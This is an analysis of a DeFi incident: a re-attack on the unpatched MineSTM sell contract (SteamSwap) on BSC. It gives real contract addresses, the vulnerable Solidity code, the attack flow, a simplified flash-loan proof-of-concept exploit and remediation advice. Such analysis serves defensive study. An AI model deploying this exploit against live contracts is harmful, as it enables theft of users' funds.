# SteamSwap — updateAllowance() + sell() Large-Scale Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | SteamSwap (MineSTM Re-attack) |
| **Chain** | BSC |
| **Loss** | ~$91,000 |
| **MineSTM Contract** | [0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6](https://bscscan.com/address/0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6) |
| **STM Token** | [0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0](https://bscscan.com/address/0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0) |
| **BUSDT/STM Pair** | [0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C](https://bscscan.com/address/0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C) |
| **PancakeSwap V3 Pool** | [0x92b7807bF19b7DDdf89b706143896d05228f3121](https://bscscan.com/address/0x92b7807bF19b7DDdf89b706143896d05228f3121) |
| **PancakeRouter** | [0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702](https://bscscan.com/address/0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702) |
| **Root Cause** | `updateAllowance()` + `sell()` vulnerability enabling AMM reserve manipulation for profit — lack of access control allows arbitrary callers to update allowance and execute large-scale sells |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/SteamSwap_exp.sol) |

---

## 1. Vulnerability Overview

The SteamSwap attack reused the same `updateAllowance()` + `sell()` vulnerability in the MineSTM contract (0xb7D0A1) at a larger scale (500,000 BUSDT). With the initial MineSTM attack left unpatched, the same attack vector was exploited using a flash loan 10x larger, stealing approximately $91K. This case demonstrates that an unpatched vulnerable contract can be repeatedly exploited at increasing scale.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: MineSTM updateAllowance + sell (unpatched)
contract MineSTM {
    // Remains unpatched after the initial attack (~$13.8K)
    function updateAllowance() external {
        // No access control — still callable by anyone
        uint256 pairBalance = STM.balanceOf(pair);
        internalAllowance[msg.sender] = pairBalance;
    }

    function sell(uint256 numerator, uint256 denominator) external {
        uint256 allowance = internalAllowance[msg.sender];
        uint256 sellAmount = allowance * numerator / denominator;
        uint256 busdt = calculateBUSDT(sellAmount);
        STM.transferFrom(msg.sender, address(this), sellAmount);
        BUSDT.transfer(msg.sender, busdt);
    }
}

// ✅ Safe code: Immediate patch required
function updateAllowance() external onlyOwner {
    // Only owner can update allowance
}

function sell(uint256 amount) external {
    require(amount <= MAX_SELL_PER_TX, "exceeds limit");
    // Use TWAP-based price
    uint256 price = getTWAPPrice();
    uint256 busdt = amount * price / PRECISION;
    STM.transferFrom(msg.sender, address(this), amount);
    BUSDT.transfer(msg.sender, busdt);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: SteamSwap_decompiled.sol
contract SteamSwap {
    function updateAllowance() external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (SteamSwap)
  │
  ├─→ [1] PancakeV3 Flash Loan: 500,000 BUSDT
  │         └─ 0x92b7807bF19b7DDdf89b706143896d05228f3121
  │         └─ 10x the scale of the MineSTM attack
  │
  ├─→ [2] BUSDT/STM pair.sync()
  │         └─ Reserve manipulation
  │
  ├─→ [3] Swap 500,000 BUSDT → STM (PancakeRouter)
  │         └─ Acquire large amount of STM
  │
  ├─→ [4] MineSTM.updateAllowance()
  │         └─ Unpatched → allowance set using manipulated pair balance
  │
  ├─→ [5] MineSTM.sell(numerator, denominator) × multiple calls
  │         └─ Receive excess BUSDT via manipulated allowance
  │
  ├─→ [6] Repay V3 flash loan (500,050 BUSDT)
  │
  └─→ [7] ~$91K profit (~6.6x the initial MineSTM attack)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IMineSTM {
    function updateAllowance() external;
    function sell(uint256 numerator, uint256 denominator) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    IMineSTM constant mineSTM = IMineSTM(0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6);
    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IUniswapV2Pair constant stmPair = IUniswapV2Pair(0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant STM = IERC20(0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0);

    function testExploit() external {
        // [1] 10x the initial MineSTM attack — 500,000 BUSDT flash loan
        v3Pool.flash(address(this), 500_000e18, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // [2] Manipulate pair reserves
        stmPair.sync();

        // [3] Swap 500,000 BUSDT → large amount of STM
        swapBUSDTToSTM(500_000e18);

        // [4] updateAllowance — still passes due to unpatched state
        mineSTM.updateAllowance();

        // [5] Repeated sell calls — receive large amount of BUSDT
        uint256 stmBal = STM.balanceOf(address(this));
        STM.approve(address(mineSTM), stmBal);
        mineSTM.sell(81, 7);
        mineSTM.sell(81, 7);
        // Additional iterations as needed

        // [6] Repay flash loan
        BUSDT.transfer(address(v3Pool), 500_000e18 + fee0);
        // Remaining ~$91K profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Unpatched re-attack (missing access control on updateAllowance) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (large-scale re-execution of sync() + updateAllowance() + sell()) |
| **DApp Category** | Token sell contract (MineSTM) |
| **Impact** | Prior attack left unpatched → 6.6x scale damage (~$91K) |

## 6. Remediation Recommendations

1. **Immediate patch**: Add `onlyOwner` to `updateAllowance()` as soon as the initial attack is discovered
2. **Contract pause**: Use a `pause()` mechanism to prevent further damage upon attack detection
3. **On-chain monitoring**: Real-time detection of abnormally large `sell()` call volumes
4. **Vulnerability reproduction test**: Confirm the same PoC cannot be reproduced after patching

## 7. Lessons Learned

- Failing to patch immediately after an initial attack leads to larger-scale re-attacks.
- The pattern of re-executing the same vulnerability with a larger flash loan amount is extremely common in DeFi attacks.
- Attack detection systems and emergency pause mechanisms are essential defenses against secondary damage.